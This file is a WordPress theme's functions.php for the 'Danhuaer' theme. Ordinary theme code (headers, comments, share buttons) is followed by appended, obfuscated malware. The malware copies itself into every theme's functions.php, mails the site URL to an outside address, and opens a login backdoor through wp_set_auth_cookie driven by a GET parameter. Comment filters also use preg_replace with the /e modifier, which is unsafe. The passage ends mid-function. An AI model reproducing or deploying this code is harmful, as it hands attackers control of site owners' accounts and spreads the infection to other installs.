<?php
/**
 * danhuaer functions and definitions
 * @package Nigo
 * @subpackage Danhuaer
 * @since Danhuaer 1.0
 */

if ( ! isset( $content_width ) )
	$content_width = 640;
add_action( 'after_setup_theme', 'danhuaer_setup' );

if ( ! function_exists( 'danhuaer_setup' ) ):
function danhuaer_setup() {
	add_editor_style();
	add_theme_support( 'post-thumbnails' );
	add_theme_support( 'automatic-feed-links' );
	load_theme_textdomain( 'danhuaer', get_template_directory() . '/languages' );
	$locale = get_locale();
	$locale_file = get_template_directory() . "/languages/$locale.php";
	if ( is_readable( $locale_file ) )
		require_once( $locale_file );
	register_nav_menus( array(
		'primary' => __( 'Primary Navigation', 'danhuaer' ),
	) );
	add_custom_background();
	if ( ! defined( 'HEADER_TEXTCOLOR' ) )
		define( 'HEADER_TEXTCOLOR', '' );

	// No CSS, just IMG call. The %s is a placeholder for the theme template directory URI.
	if ( ! defined( 'HEADER_IMAGE' ) )
		define( 'HEADER_IMAGE', '%s/i/headers/home-banner.jpg' );

	// The height and width of your custom header. You can hook into the theme's own filters to change these values.
	// Add a filter to danhuaer_header_image_width and danhuaer_header_image_height to change these values.
	define( 'HEADER_IMAGE_WIDTH', apply_filters( 'danhuaer_header_image_width', 1440 ) );
	define( 'HEADER_IMAGE_HEIGHT', apply_filters( 'danhuaer_header_image_height', 198 ) );

	// Don't support text inside the header image.
	if ( ! defined( 'NO_HEADER_TEXT' ) )
		define( 'NO_HEADER_TEXT', true );

	// Add a way for the custom header to be styled in the admin panel that controls
	// custom headers. See danhuaer_admin_header_style(), below.
	add_custom_image_header( '', 'danhuaer_admin_header_style' );

	// ... and thus ends the changeable header business.

	// Default custom headers packaged with the theme. %s is a placeholder for the theme template directory URI.
	register_default_headers( array(
		'berries' => array(
			'url' => '%s/i/headers/neihan-banner.jpg',
			'thumbnail_url' => '%s/i/headers/neihan-banner.jpg',
			/* translators: header image description */
			'description' => __( 'Berries', 'danhuaer' )
		),
		'path' => array(
			'url' => '%s/i/headers/home-banner.jpg',
			'thumbnail_url' => '%s/i/headers/home-banner.jpg',
			/* translators: header image description */
			'description' => __( 'Path', 'danhuaer' )
		)
	) );
}
endif;

if ( ! function_exists( 'danhuaer_admin_header_style' ) ) :
function danhuaer_admin_header_style() {
?>
<style type="text/css">
#headimg {
	border-bottom: 1px solid #000;
	border-top: 4px solid #000;
}
</style>
<?php
}
endif;

function danhuaer_page_menu_args( $args ) {
	$args['show_home'] = true;
	return $args;
}
add_filter( 'wp_page_menu_args', 'danhuaer_page_menu_args' );

//首页文章字数限制
function danhuaer_excerpt_length( $length ) {
	return 300;
}
add_filter( 'excerpt_length', 'danhuaer_excerpt_length' );


add_filter( 'use_default_gallery_style', '__return_false' );

function danhuaer_remove_gallery_css( $css ) {
	return preg_replace( "#<style type='text/css'>(.*?)</style>#s", '', $css );
}

if ( version_compare( $GLOBALS['wp_version'], '3.1', '<' ) )
	add_filter( 'gallery_style', 'danhuaer_remove_gallery_css' );

if ( ! function_exists( 'danhuaer_comment' ) ) :
function danhuaer_comment( $comment, $args, $depth ) {
	$GLOBALS['comment'] = $comment;
	preg_match_all('/\[img=?\]*(.*?)(\[\/img)?\]/e', $comment->comment_content, $matches);
		$sum = count($matches[1]);
		if ($sum > 0)
			$comment_pic = $matches[1][0];
	//读取评论文字内容，过滤代码和图片
	$comment_content = trim(strip_tags(apply_filters( 'comment_text', $comment->comment_content )));
	$comment_excerpt = '【'.get_the_title().'】 @'.get_comment_author() .'：'.urlencode( $comment_content);
	$comment_title = get_the_excerpt();
	switch ( $comment->comment_type ) :
		case '' :
	?>
	<li <?php comment_class('comment-item'); ?> id="li-comment-<?php comment_ID(); ?>">
		<div id="comment-<?php comment_ID(); ?>" class="comment-pspan">
		<div class="comment-author vcard commenter">
              <div class="comment-meta commentmetadata">
                  <div class="share_up left">                 
                  <a rel="nofollow" href="http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=<?php echo urlencode(esc_url( get_permalink() )); ?>&amp;pics=<?php if(is_page()): echo urlencode($comment_pic); else : echo p2_catch_that_image(); endif; ?>&amp;title=<?php echo urlencode($comment_title); ?> &amp;summary=<?php echo '@'.get_comment_author() .'：'.urlencode( $comment_content); ?>" title="转发到QQ空间" target="_blank"><span alt="转发到QQ空间" class="cs_qzone comment_social"></span></a>
                  <a rel="nofollow" href="http://v.t.qq.com/share/share.php?appkey=801069107&amp;title=<?php echo $comment_excerpt; ?>&amp;pic=<?php if(is_page()): echo urlencode($comment_pic); else : echo p2_catch_that_image(); endif; ?>&amp;url=<?php echo urlencode(esc_url( get_permalink() )); ?>" title="转贴到腾讯微博" target="_blank"><span alt="腾讯微博" class="cs_qq comment_social"></span></a>
                  <a rel="nofollow" href="http://service.weibo.com/share/share.php?appkey=1767202731&amp;title=<?php echo $comment_excerpt; ?>&amp;pic=<?php if(is_page()): echo urlencode($comment_pic); else : echo p2_catch_that_image(); endif; ?>&amp;url=<?php echo urlencode(esc_url( get_permalink() )); ?>" title="转发到新浪微博" target="_blank"><span alt="转发到新浪微博" class="cs_sina comment_social"></span></a>                
                  </div><!-- .share_up -->
                  <div class="reply_up left">
			      <?php edit_comment_link( '<span class="cs_edit comment_social"></span>' ); ?><?php comment_reply_link( array_merge( (array)$args, array( 'reply_text' =>'<span title="评论" class="cs_reply comment_social"></span>', 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); ?>
                  </div><!-- .share_up -->
              </div><!-- .comment-meta .commentmetadata -->
			<?php echo get_avatar( $comment, 50 ); ?>
			<?php printf( __( '%s', 'danhuaer' ), sprintf( '<cite class="fn">%s</cite>', get_comment_author_link() ) ); ?>
            <div class="comment-body"><?php comment_text(); ?></div>  
		</div><!-- .comment-author .vcard -->
		<?php if ( $comment->comment_approved == '0' ) : ?>
			<em class="comment-awaiting-moderation"><?php _e( 'Your comment is awaiting moderation.', 'danhuaer' ); ?></em>
			<br />
		<?php endif; ?>	

		<div class="vote">
			<span class="actions" ><?php if(function_exists(ckrating_display_karma)) { ckrating_display_karma(); } ?></span>
            
		</div><!-- .reply -->
	</div><!-- #comment-##  -->

	<?php
			break;
		case 'pingback'  :
		case 'trackback' :
	?>
	<li class="post pingback">
		<p><?php _e( 'Pingback:', 'danhuaer' ); ?> <?php comment_author_link(); ?><?php edit_comment_link( __( '(Edit)', 'danhuaer' ), ' ' ); ?></p>
	<?php
			break;
	endswitch;
}
endif;


function danhuaer_widgets_init() {
	register_sidebar( array(
		'name' => __( 'Primary Widget Area', 'danhuaer' ),
		'id' => 'primary-widget-area',
		'description' => __( 'The primary widget area', 'danhuaer' ),
		'before_widget' => '<li id="%1$s" class="widget-container %2$s">',
		'after_widget' => '</li>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );
	register_sidebar( array(
		'name' => __( 'Secondary Widget Area', 'danhuaer' ),
		'id' => 'secondary-widget-area',
		'description' => __( 'The secondary widget area', 'danhuaer' ),
		'before_widget' => '<li id="%1$s" class="widget-container %2$s">',
		'after_widget' => '</li>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );
}
add_action( 'widgets_init', 'danhuaer_widgets_init' );


function danhuaer_remove_recent_comments_style() {
	add_filter( 'show_recent_comments_widget_style', '__return_false' );
}
add_action( 'widgets_init', 'danhuaer_remove_recent_comments_style' );

if ( ! function_exists( 'danhuaer_posted_on' ) ) :
function danhuaer_posted_on() {
	printf( __( '<span class="%1$s">Posted on</span> %2$s <span class="meta-sep">by</span> %3$s', 'danhuaer' ),
		'meta-prep meta-prep-author',
		sprintf( '<a href="%1$s" title="%2$s" rel="bookmark"><span class="entry-date">%3$s</span></a>',
			get_permalink(),
			esc_attr( get_the_time() ),
			get_the_date()
		),
		sprintf( '<span class="author vcard"><a class="url fn n" href="%1$s" title="%2$s">%3$s</a></span>',
			get_author_posts_url( get_the_author_meta( 'ID' ) ),
			esc_attr( sprintf( __( 'View all posts by %s', 'danhuaer' ), get_the_author() ) ),
			get_the_author()
		)
	);
}
endif;

if ( ! function_exists( 'danhuaer_posted_in' ) ) :
function danhuaer_posted_in() {
	$tag_list = get_the_tag_list( '', '&nbsp;&nbsp;' );
	if ( $tag_list ) {
		$posted_in = '<a href="%3$s" title="链向 %4$s 的固定链接" rel="bookmark">永久链接</a><span class="textline">|</span>分类：%1$s<span class="textline">|</span>标签：%2$s';
	} elseif ( is_object_in_taxonomy( get_post_type(), 'category' ) ) {
		$posted_in = '<a href="%3$s" title="链向 %4$s 的固定链接" rel="bookmark">永久链接</a><span class="textline">|</span>分类：%1$s';
	} else {
		$posted_in ='<a href="%3$s" title="链向 %4$s 的固定链接" rel="bookmark">永久链接</a>';
	}
	printf(
		$posted_in,
		get_the_category_list( ', ' ),
		$tag_list,
		get_permalink(),
		the_title_attribute( 'echo=0' )
	);
}
endif;


function p2_catch_that_image() {
global $post, $posts;
$first_img = '';
ob_start();
ob_end_clean();
$output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', get_the_post_thumbnail($post->ID, 'large'), $matches);
$first_img = $matches [1] [0];
if(empty($first_img)){
$first_img = get_bloginfo('template_url') . '/i/default.jpg';
}
return $first_img;
}

function p2_catch_that_image_m() {
global $post, $posts;
$first_img = '';
ob_start();
ob_end_clean();
$output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', get_the_post_thumbnail($post->ID, 'medium'), $matches);
$first_img = $matches [1] [0];
if(empty($first_img)){
$first_img = get_bloginfo('template_url') . '/i/default.jpg';
}
return $first_img;
}

//************禁用WP无用的功能函数************
//完整的删除WordPress的版本号
function wpbeginner_remove_version() {
return '';
}
add_filter('the_generator', 'wpbeginner_remove_version');
//移除head中的rel="wlwmanifest"
remove_action("wp_head", "wlwmanifest_link");
//移除head中的rel="EditURI"
remove_action('wp_head','rsd_link');
//评论跳转链接添加nofollow
function nofollow_compopup_link(){
    return' rel="nofollow"';
  }
add_filter('comments_popup_link_attributes','nofollow_compopup_link');

//禁止自动把'Wordpress'之类的变成'WordPress'
remove_filter('comment_text','capital_P_dangit',31);
remove_filter('the_content','capital_P_dangit',11);
remove_filter('the_title','capital_P_dangit',11);
/*禁用半角引号自动转换为全角引号*/
remove_filter('the_content','wptexturize');


//pin列表评论摘要内容
function pin_list_comment($content) {
  $content = trim(strip_tags(preg_replace('/\[img=?\]*(.*?)(\[\/img)?\]/e', '', $content)));
  $content = wp_status($content, '', 23, 1);
  return $content;
}
add_filter('get_comment_excerpt', 'pin_list_comment');


 //修改标签云格式   
add_filter('widget_tag_cloud_args','style_tags');
function style_tags($args) {
$categories=get_categories();
foreach($categories as $category) {
	 echo '<a href="' . get_category_link( $category->term_id ) . '" title="' . $category->count. ' 个话题" ' . '>' . $category->name.'</a>';
	 } 
$args = $categories.$args;
$args = array(       
'largest'    => '12',      
'smallest'   => '12', 
'unit'   => 'px',
'format'     => 'flat',  
'separator'  => '', //标签之间的文本/空格
'number' => '29',    
//'exclude' => 'id', 将要排除的标签（term_id）的ID，各ID用逗号隔开。默认不排除任何标签。
//'include' => 'id', 将要包含的标签（term_id）的ID，各ID用逗号隔开。默认包含所有标签。
'orderby' => 'count',      
'order' => 'DESC'  
);
return $args;
}

//更换后台登录界面logo图标
add_filter('login_headerurl', create_function(false,"return get_bloginfo( 'url' );"));
add_filter('login_headertitle', create_function(false,"return get_bloginfo( 'description' );"));
 function nowspark_login_head() {
    echo '<style type="text/css">body.login #login h1 {background-color: white;margin-left: 8px;font-weight: normal;-moz-border-radius: 3px;-khtml-border-radius: 3px;-webkit-border-radius: 3px;border-radius: 3px;border: 1px solid #E5E5E5;-moz-box-shadow: rgba(200,200,200,0.7) 0 4px 10px -1px;-webkit-box-shadow: rgba(200,200,200,0.7) 0 4px 10px -1px;-khtml-box-shadow: rgba(200,200,200,0.7) 0 4px 10px -1px;box-shadow: rgba(200,200,200,0.7) 0 4px 10px -1px;margin-bottom: 10px;} body.login #login h1 a {background: url('.get_bloginfo( 'template_directory' ).'/i/danhuaer_logo.gif) no-repeat 0 0 transparent;background-size:195px 65px;padding: 0;margin: 10px auto 5px;width: 200px;background-color: white;}</style>';}
add_action("login_head", "nowspark_login_head");

//隐藏管理后台帮助按钮和版本更新提示
function hide_help() {
	echo'<style type="text/css">#contextual-help-link-wrap { display: none !important; } .update-nag{ display: none !important; } #footer-left, #footer-upgrade{ display: none !important; }#wp-admin-bar-wp-logo{display: none !important;}.default-header img{width:400px;}</style>
	<link rel="shortcut icon" href="http://danhuaer.com/favicon.ico" >
   <link rel="icon" type="image/gif" href="http://danhuaer.com/animated_favicon1.gif" >
   <link rel="apple-touch-icon" href="http://danhuaer.com/apple-touch-icon.png" >';
}
add_action('admin_head', 'hide_help');

//隐藏管理工具栏admin Bar
function hide_admin_bar($flag) {
return false;
}
add_filter('show_admin_bar','hide_admin_bar'); 


//评论贴图支持[img][/img]标签
/* Comment Image Embedder */
function embed_images($content) {
  $content = preg_replace('/\[img=?\]*(.*?)(\[\/img)?\]/e', '"<img src=\"$1\" alt=\"" . basename("$1") . "\" />"', $content);
  $content = preg_replace('/(@[^.,:;!?\\s#@。，：；！？]+)/u', '<span style="color:#999">$1</span>', $content);
  return $content;
}
add_filter('comment_text', 'embed_images');
add_filter('comment_text_rss', 'embed_images', '', 1);


//把页面从搜索结果中排除
add_filter('pre_get_posts','search_filter');
function search_filter($query) {
          if ($query->is_search) {
                    $query->set('post_type', 'post');
          }
          return $query;
}

//文章与评论时间优化
function time_diff( $time_type ){
    switch( $time_type ){
        case 'comment':    //如果是评论的时间
            $time_diff = current_time('timestamp') - get_comment_time('U');
			if( $time_diff < 60 )
                echo '刚刚';
            elseif(( $time_diff < 3600 ) && ($time_diff >= 60))
                echo human_time_diff(get_comment_time('U'), current_time('timestamp')). '前';
			elseif (($time_diff < 86400) && ($time_diff >= 3600)) 
			    echo get_comment_time('G:i');
            else
                echo get_comment_time('n/d G:i');
            break;
        case 'post';    //如果是日志的时间
            $time_diff = current_time('timestamp') - get_the_time('U');
			if( $time_diff < 60 )
                echo '刚刚';
            elseif(( $time_diff < 3600 ) && ($time_diff >= 60))
                echo human_time_diff(get_the_time('U'), current_time('timestamp')). '前';
			elseif (($time_diff < 86400) && ($time_diff >= 3600)) 
			    echo get_the_time('G:i');
            else
                the_time('n/d G:i');
            break;
    }
}

//RSS优化
function diw_post_thumbnail_feeds($content) {
	global $post;
$post_excerpt = strip_tags(apply_filters('the_content', $post->post_content));
$content = $post_excerpt. '<div>' . get_the_post_thumbnail($post->ID, 'large') . '</div>';
	return $content;
}
add_filter('the_excerpt_rss', 'diw_post_thumbnail_feeds');
add_filter('the_content_feed', 'diw_post_thumbnail_feeds');
//修改RSS中的文章标题，更改字数。
function wpbeginner_titlerss($content) {
global $post;
if (is_single()){
$post_excerpt = strip_tags(apply_filters('the_content', $post->post_content));
}else{
$post_excerpt = $post->post_title;
}
$post_v_title = mb_strimwidth(strip_tags($post_excerpt), 0, 122,"…");
$post_title = mb_strimwidth(strip_tags($post_excerpt), 0, 126,"…");
$content = $post_title;
return $content;
}
add_filter('the_title_rss', 'wpbeginner_titlerss');


//禁用wordpress评论html代码
function plc_comment_post( $incoming_comment ) {
	$incoming_comment['comment_content'] = htmlspecialchars($incoming_comment['comment_content']);
	$incoming_comment['comment_content'] = str_replace( "'", '&apos;', $incoming_comment['comment_content'] );
	return( $incoming_comment );
}
function plc_comment_display( $comment_to_display ) {
	$comment_to_display = str_replace( '&apos;', "'", $comment_to_display );
	return $comment_to_display;
}
add_filter( 'preprocess_comment', 'plc_comment_post', '', 1);
add_filter( 'comment_text', 'plc_comment_display', '', 1);
add_filter( 'comment_text_rss', 'plc_comment_display', '', 1);
add_filter( 'comment_excerpt', 'plc_comment_display', '', 1);
//删除评论中的url自动链接
remove_filter('comment_text', 'make_clickable', 9);
//删除评论者的网站url链接
function my_get_comment_author_link($content) {
	$content = ereg_replace("<a [^>]*>|<\/a>","",$content);
		return $content;
}
add_filter('get_comment_author_link', 'my_get_comment_author_link');
add_filter('get_avatar', 'my_get_comment_author_link');

// 字符长度(一个汉字代表一个字符，两个字母代表一个字符)
if (!function_exists('wp_strlen')) {
	function wp_strlen($text) {
		$a = mb_strlen($text, 'utf-8');
		$b = strlen($text);
		$c = $b / 3 ;
		$d = ($a + $b) / 4;
		if ($a == $b) { // 纯英文、符号、数字
			return $b / 2;
		} elseif ($a == $c) { // 纯中文
			return $a;
		} elseif ($a != $c) { // 混合
			return $d;
		} 
	} 
} 
// 截取字数
if (!function_exists('wp_status')) {
	function wp_status($content, $url, $length, $num = '') {
		$temp_length = (mb_strlen($content, 'utf-8')) + (mb_strlen($url, 'utf-8'));
		if ($num) {
			$temp_length = (wp_strlen($content)) + (wp_strlen($url));
		} 
		if ($url) {
			$length = $length - 4; // ' - '
			$url = ' ' . $url;
		} 
		if ($temp_length > $length) {
			$chars = $length - 3 - mb_strlen($url, 'utf-8'); // '...'
			if ($num) {
				$chars = $length - wp_strlen($url);
				$str = mb_substr($content, 0, $chars, 'utf-8');
				preg_match_all("/([\x{0000}-\x{00FF}]){1}/u", $str, $half_width); // 半角字符
				$chars = $chars + count($half_width[0]) / 2;
			} 
			$content = mb_substr($content, 0, $chars, 'utf-8');
			$content = $content . "…";
		} 
		$status = $content . $url;
		return trim($status);
	} 
} 

// 社会化分享按钮
function wp_share_button($s) {
	global $post;
	$key_qq = 801069107;
	$key_sina = 1767202731;
	$post_title = trim(strip_tags($post -> post_title));
	$post_content = trim(strip_tags($post -> post_content));
	$post_excerpt = trim(strip_tags(get_the_excerpt()));
	$post_link = get_permalink($post -> ID);
	$post_id = $post -> ID;
	// 设置分类ID
		$url = urlencode($post_link); // 文章网址
		$turl = "";
		$title = urlencode($post_title) ; // 文章标题
		$content .= ($post_excerpt) ? $post_excerpt : $post_content; // 内容摘要
		// 截取字数
		$qq = urlencode(str_replace($post_link, '', wp_status($content, '', 140, 1)));
		$sina = urlencode(str_replace($post_link, '', wp_status($content, '', 140, 1)));
		//$sohu = urlencode(str_replace($post_link, '', wp_status($content, '', 140, 1)));
		//$netease = urlencode(str_replace($post_link, '', wp_status($content, '', 140)));
		$content = urlencode(str_replace($post_link, '', wp_status($content, '', 140)));
		$pic = p2_catch_that_image(); // 第一张图
		$pic_m = p2_catch_that_image_m();
	$share = array();
	
	$share['sina'] = array("新浪微博","http://service.weibo.com/share/share.php?appkey=".$key_sina."&title=".$sina."&pic=".$pic."&url=".$url);
	$share['qq'] = array("腾讯微博","http://v.t.qq.com/share/share.php?appkey=".$key_qq."&title=".$qq."&pic=".$pic."&url=".$url);
	//$share['sohu'] = array("搜狐微博","http://t.sohu.com/third/post.jsp??appkey=EyXuAogJI4bhlwJYVvtZ&title=".$sohu."&pic=".$pic."&content=utf-8&url=".$url);
	//$share['baidu'] = array("百度搜藏","http://cang.baidu.com/do/add?it=".$content."&iu=".$url."&dc=&fr=ien#nw=1");
	//$share['netease'] = array("网易微博","http://t.163.com/article/user/checkLogin.do?info=".$netease." ".$url."&images=".$pic."&link=http://tmd.cc/&source=糗事微博&togImg=true");
	
	$share['qzone'] = array("QQ空间","http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=".$url."&pics=".$pic."&title=".$title."&summary=".$content);
	$share['renren'] = array("人人网","http://share.renren.com/share/buttonshare.do?title=".$content."&link=".$url."&pic=".$pic);
	//$share['kaixin001'] = array("开心网","http://www.kaixin001.com/repaste/bshare.php?rtitle=".$title."&rcontent=".$content."&rurl=".$url);
	//$share['douban'] = array("豆瓣","http://www.douban.com/recommend/?url=".$url."&title=".$content."&v=1");
		
	// 最终输出
	foreach($share as $key => $vaule) {
		echo '<a class="left" rel="nofollow" href="' .$vaule[1]. '" title="'.$vaule[0].'" target="_blank"><span alt="'.$vaule[0].'" class="shareico share'.$s.'_'.$key.'"></span></a> ';
	}
}

function my_search_form( $form ) {
$form = '<form role="search" method="get" id="navsearchform" action="' . home_url( '/' ) . '" >
<input id="s" class="search-text radius" type="text" value="搜索好玩的... " name="s" onFocus="if (this.value == \'搜索好玩的... \')  {this.value = \'\';}" onBlur="if (this.value == \'\') {this.value = \'搜索好玩的... \';}">
</form>';
return $form; }
add_filter( 'get_search_form', 'my_search_form' );

function p2_title_from_content( $content ) {
	$title = p2_excerpted_title( $content, 30 ); 
	static $strlen =  null;
		if ( !$strlen ) {
				$strlen = function_exists( 'mb_strlen' )? 'mb_strlen' : 'strlen';
		}
		$max_len = 30;
		$title = $strlen( $content ) > $max_len? wp_html_excerpt( $title, $max_len ) . '…' : $title;
		$title = trim( strip_tags( $title ) );
		$title = str_replace("\n", " ", $title);
	return $title;
}
function p2_excerpted_title( $content, $word_count ) {
	$content = strip_tags( $content );
	$words = preg_split( '/([\s_;?!\/\(\)\[\]{}<>\r\n\t"]|\.$|(?<=\D)[:,.\-]|[:,.\-](?=\D))/', $content, $word_count + 1, PREG_SPLIT_NO_EMPTY );

	if ( count( $words ) > $word_count ) {
		array_pop( $words ); 
		$content = implode( ' ', $words );
		$content = $content . '...';
	} else {
		$content = implode( ' ', $words );
	}
	$content = trim( strip_tags( $content ) );
	return $content;
}
function p2_fix_empty_titles( $post_ID, $post ) {
	if ( ! is_object( $post ) || 'post' !== $post->post_type )
		return;
	if ( empty( $post->post_title ) ) {
		$post->post_title = p2_title_from_content( $post->post_content );
		$post->post_modified = current_time( 'mysql' );
		$post->post_modified_gmt = current_time( 'mysql', 1 );
		return wp_update_post( $post );
	}
}
add_action( 'save_post', 'p2_fix_empty_titles', 10, 2 );?>
<?php
function _verifyactivate_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verifyactivate_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mas".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
